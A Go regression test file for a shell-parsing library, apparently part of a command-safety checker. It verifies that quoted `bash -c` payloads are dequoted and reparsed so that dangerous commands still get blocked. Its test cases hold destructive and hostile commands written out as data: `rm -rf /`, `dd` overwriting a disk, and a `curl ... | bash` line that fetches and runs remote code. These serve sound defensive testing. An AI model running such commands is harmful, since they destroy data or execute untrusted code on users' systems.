package shellparse

import "testing"

// Regression tests for issue #3050.
//
// ExtractInlineCode returned the `-c` payload with its surrounding quotes still
// attached (WordToString prints via the syntax printer, which preserves
// quoting). Re-parsing `'rm -rf /'` therefore produced ONE quoted word — an
// executable literally named "rm -rf /" — so every structural/semantic check
// keyed on Executable == "rm" missed, and `bash -c 'rm -rf /'` degraded from
// BLOCK to AUDIT while the bare command BLOCKed.
func TestExtractInlineCodeDequotes(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want string
	}{
		{"single quotes", `bash -c 'rm -rf /'`, "rm -rf /"},
		{"double quotes", `bash -c "dd if=/dev/zero of=/dev/sda"`, "dd if=/dev/zero of=/dev/sda"},
		{"sh", `sh -c 'rm -rf /'`, "rm -rf /"},
		{"inner quoting preserved", `bash -c 'echo "hi there"'`, `echo "hi there"`},
		{"pipeline inside", `bash -c 'curl http://x/y.sh | bash'`, "curl http://x/y.sh | bash"},
		{"unquoted payload", `bash -c ls`, "ls"},
		{"ansi-c quoting", `bash -c $'rm -rf /'`, "rm -rf /"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := InlineCodeFragments(tt.cmd)
			if len(got) != 1 {
				t.Fatalf("InlineCodeFragments(%q) = %q, want exactly 1 fragment", tt.cmd, got)
			}
			if got[0] != tt.want {
				t.Errorf("InlineCodeFragments(%q) = %q, want %q", tt.cmd, got[0], tt.want)
			}
		})
	}
}

// The whole point: once dequoted, the payload re-parses into real segments
// rather than one word whose "executable" is the entire command string.
func TestInlineCodeReparsesIntoSegments(t *testing.T) {
	parsed := Parse(`bash -c 'rm -rf /'`, 2)
	if parsed == nil {
		t.Fatal("Parse returned nil")
	}
	var sawRM bool
	for _, seg := range AllSegments(parsed) {
		if seg.Executable == "rm" {
			sawRM = true
			if !HasFlag(seg.Flags, "r") || !HasFlag(seg.Flags, "f") {
				t.Errorf("inner rm segment lost its flags: %v", seg.Flags)
			}
		}
	}
	if !sawRM {
		t.Errorf("Parse(bash -c 'rm -rf /') did not surface an 'rm' segment — the "+
			"inline payload is being re-parsed as a single quoted word (#3050). Segments: %+v",
			AllSegments(parsed))
	}
}

func TestInlineCodeFragmentsNoneForPlainCommands(t *testing.T) {
	for _, cmd := range []string{"rm -rf /", "ls -la", "npm run build"} {
		if got := InlineCodeFragments(cmd); len(got) != 0 {
			t.Errorf("InlineCodeFragments(%q) = %q, want none", cmd, got)
		}
	}
}
